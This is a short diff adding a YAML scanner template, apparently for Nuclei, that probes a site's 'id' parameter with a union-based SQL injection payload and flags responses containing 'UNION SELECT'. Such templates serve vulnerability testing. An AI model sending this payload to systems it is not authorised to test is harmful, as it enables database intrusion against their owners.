@@ -1,0 +1,12 @@
+id: K70n0s510-sqli-union
+info:
+  name: Union-Based SQLi (NULL Injection)
+  author: K70n0s510
+  severity: high
+  tags: sqli,union
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?id=-1' UNION SELECT 1,2,3,4--"]
+    matchers:
+      - type: word
+        words: ["UNION SELECT"] # Looking for reflection of the error or data
